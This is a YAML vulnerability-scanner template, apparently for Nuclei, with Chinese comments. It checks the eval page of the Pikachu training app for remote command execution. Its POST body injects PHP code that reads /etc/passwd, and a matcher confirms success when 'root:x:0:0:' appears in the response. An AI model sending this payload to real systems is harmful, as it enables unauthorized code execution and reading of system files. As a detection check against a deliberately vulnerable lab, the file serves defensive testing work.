id: pikachu_rce_eval_cat_password # 模板的唯一标识符

info:
  name: PikachuRCEEval # 模板名称
  author: 233 # 作者名称  
  severity: unknown # 漏洞严重程度
  description: |
    pikachu_rce_eval_cat_password 检测 /vul/rce/rce_eval.php 路径下是否存在远程命令执行漏洞，通过提交恶意命令并检查响应内容。
  reference:
  - "https://gitlab.hillstonenet.com/a-dlab/adlab-wiki/-/blob/main/漏洞信息库/命令执行类/命令执行_pikachu-rce-exec-eval/命令执行_pikachu-rce-exec-eval.md" # 参考链接
  tags: rce,PHP,pikachu

http:
- method: POST # HTTP 请求方法
  path:
  - "{{BaseURL}}/vul/rce/rce_eval.php" # 请求路径，{{BaseURL}} 为目标基 URL
  headers:
    Content-Length: "82" # 内容长度
    Cache-Control: "max-age=0" # 缓存控制
    Upgrade-Insecure-Requests: "1" # 升级不安全请求
    Content-Type: "application/x-www-form-urlencoded" # 内容类型
    User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.107 Safari/537.36" # 用户代理
    Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" # 接受的内容类型
    Referer: "{{BaseURL}}/vul/rce/rce_eval.php" # 引用页
    Accept-Encoding: "gzip, deflate" # 接受的编码
    Accept-Language: "zh-CN,zh;q=0.9" # 接受的语言
    Cookie: "PHPSESSID=9tru1fbi3fto5uguhu9fd395ie" # Cookie
    Connection: "close" # 连接方式
  body: "txt=echo+file_get_contents%28%27%2Fetc%2Fpasswd%27%29%3B&submit=%E6%8F%90%E4%BA%A4" # 请求体
  matchers-condition: and # 匹配条件
  matchers:
  - type: word # 匹配器类型：关键字匹配
    part: body # 匹配响应体
    words:
    - "root:x:0:0:" # 用于确认 /etc/passwd 内容的关键字
  - type: status # 匹配器类型：状态码匹配
    status:
    - 200 # 预期的 HTTP 状态码
